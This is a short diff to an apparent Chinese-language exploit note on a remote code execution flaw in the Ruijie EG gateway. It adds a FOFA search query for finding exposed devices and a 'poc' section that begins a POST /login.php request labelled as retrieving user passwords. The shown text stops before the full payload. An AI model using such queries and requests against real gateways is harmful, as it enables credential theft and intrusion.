@@ -1,4 +1,11 @@
 ##  锐捷-EG易网关存在RCE漏洞
+
+## fofa
+```
+app="Ruijie-EG易网关"
+```
+
+## poc
 ```
 获取用户密码
 POST /login.php HTTP/1.1
